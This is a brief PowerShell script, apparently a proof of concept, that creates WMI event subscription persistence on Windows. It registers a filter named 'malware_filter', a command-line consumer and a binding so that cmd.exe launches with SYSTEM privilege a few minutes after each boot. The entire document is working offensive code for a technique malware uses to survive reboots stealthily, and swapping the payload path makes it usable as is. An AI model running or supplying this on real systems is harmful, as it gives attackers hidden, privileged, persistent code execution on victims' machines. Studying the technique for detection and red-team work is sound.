#Creating a persistence which will start cmd.exe a short period(about 5 minutes) after the system starts.
#You should check the TaskManager to see if there existing a cmd.exe with System Privilege
$filtername = "malware_filter"
$consumername = "malware_consumer"
$payloadpath = "c:\windows\system32\cmd.exe"
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60
WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
AND TargetInstance.SystemUpTime >= 200 AND
TargetInstance.SystemUpTime < 320"
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
Name=$filtername;
EventNameSpace="root\cimv2";
QueryLanguage="WQL";Query=$Query
} -ErrorAction Stop
$consumer = Set-WmiInstance -class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
Name=$consumername;
ExecutablePath=$payloadpath;
CommandLineTemplate=$payloadpath
}
Set-WmiInstance -class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
Filter=$filter;
Consumer=$consumer
}
